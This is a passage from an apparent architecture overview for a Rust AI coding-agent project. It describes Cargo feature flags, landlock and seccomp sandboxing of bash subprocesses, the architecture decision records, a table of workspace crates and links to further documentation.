  so zero computer_use wire bytes reach the API in a default build. The
  local headless-Chrome CDP `computer_use` tool
  (`src/tools/computer_use.rs`) is a separate capability and is
  unaffected.
- `landlock` – no longer a Cargo feature (WO 27.1). There is no `landlock`
  feature key in `[features]` at all; the landlock module is compiled
  unconditionally on Linux via `cfg(target_os = "linux")` and applied by
  default in the bash `pre_exec` hook (fail-closed). Operators escape via
  `--i-accept-unsandboxed` on kernels where `restrict_self` errors;
  `landlock_extra_paths` in config.toml extends the allow-list.
- `seccomp` (non-default) — Linux seccomp-bpf syscall filter for bash
  subprocesses (WO 30.4). Confines the syscall surface to an allowlist;
  everything else fails with `EPERM` (graceful, not `SIGSYS`-kill). Applied
  in the same `pre_exec` hook as landlock + rlimits, after landlock. Default
  OFF: opt in via `--features seccomp`. The allowlist is a starting set
  (bash + grep/sed/awk/curl/cargo/node/python + the glibc startup syscalls);
  real-workload tuning is deferred (see WO 30.4). Brings in the `seccompiler`
  crate (pure-Rust BPF compiler, no C deps).
- `otel` (non-default) — OpenTelemetry span/metric export.

Three plugins are feature-gated compiled-in modules, served as direct Rust
calls when their feature is on. `stratum` and `kf-budget` retain shell-plugin
fallback sources for feature-off builds; `kf-plugin` does not (its shell tree
was deleted in WO 29.9). ADR-050 pins the two-path dispatch consolidation
design. The `dep:` optional-dependency pattern is what makes per-plugin
opt-in possible.

ADR-0017's "no `[features]` section" rule is scoped to `crates/kf-budget-core/`,
not the root binary.

---

## ADRs

92 Architecture Decision Records live in [docs/adr/](docs/adr/). They pin
load-bearing decisions: token budget (0005), slicing orchestrator (0007),
verifier bus (0028, 0043), context index (037), benchmark harness (038),
execution replay (039), VFS minification (053), coverage-gate threshold
policy (065), CI architecture reset (074), Emission flattening for the
executor-backed ModelClient (075), and many more. A drift test
(`adr_xref_drift`) enforces that ADR file headers and the README index
table agree.

Conventions: `ponytail:` annotations pin spec literals (if a ponytail test
fails, the spec and impl drifted, not the test). `ceiling:` and `upgrade path:`
document known limitations. Removing these is a regression.

---

## Crate map

| Crate | Status | Purpose | Public API | Consumers |
|---|---|---|---|---|
| `kf-plugin-sdk` | Active | Plugin manifest types, trust tiers | `PluginManifest`, `TrustTier` | `kf-plugin-host`, root binary |
| `kf-plugin-host` | Active | Plugin registry, dispatch, signatures | `PluginHost`, `PluginToolWrapper` | root binary |
| `kf-context-index` | Active | Tree-sitter symbol/import/call-graph index | `ContextIndex`, `CachedIndex` | root binary |
| `kf-workflow` | Active | JSON workflow engine (DAG of persona steps) | `WorkflowExecutor`, `WorkflowTemplate` | root binary |
| `kf-lsp` | Active | LSP client pool for symbol-aware navigation | `LspPool` | root binary |
| `kf-bench` | Active | Benchmark task types, loader, verifier, reports | `BenchTask`, `TaskResult` | root binary, bench CI |
| `kf-compress-core` | Active | Context-compression pipeline library | `CompressionPipeline`, `Mode`, `rules::build_rules` | root binary (via `stratum` feature) |
| `kf-budget-core` | Active | Budget/orchestrator/slicing data model | `TokenBudget`, `SlicingOrchestrator` | root binary (via `budget` feature) |
| `kf-routing` | Active | Pure orchestrator modules (classifier, routing, correction, path safety) | `build_empirical_recommendation`, `tokenize`, `vectorize`, `cosine` | `kf-memory-store`, `kf-orchestrator` |
| `kf-rbac` | Active | RBAC + JWT/JWKS verification (port of `@kirkforge/core-rbac`) | `Rbac`, `Actor`, `ApiKeys`, `OidcVerifier` | standalone (security surface) |
| `kf-memory-store` | Active | Routing-oriented memory store (port of `@kirkforge/memory-palace`) | `MemoryStore`, `MemoryAdapter`, `FileAdapter`, `SqliteAdapter`, `InMemoryAdapter` | `kf-orchestrator` |
| `kf-orchestrator` | Active | Orchestrator delegation + decompose + correction pipeline (port of `@kirkforge/orchestrator`) | `Orchestrator`, `delegate`, `run_correction_loop`, `ModelClient`, `WorkspaceManager`, `verifier::scan_files` | standalone (foundation for full executor wiring) |
| `kf-testdoctor` | Active | Test-performance diagnostics | `doctor` CLI | root binary (`kf-code doctor`) |

"Excluded" crates exist on disk but are not built by default (`cargo build
--workspace`). They can be built explicitly with `-p <crate-name>`.

---

## Where to go next

- **README.md** — user-facing landing page
- **[docs/adr/](adr/)** — pinned decisions and their rationale
- **[docs/workorders/](workorders/)** — planned and in-progress work
- **[AGENTS.md](../AGENTS.md)** — worker contract for AI agents in this repo
- **[state.md](../state.md)** — current production-readiness state
- **[CHANGELOG.md](../CHANGELOG.md)** — release history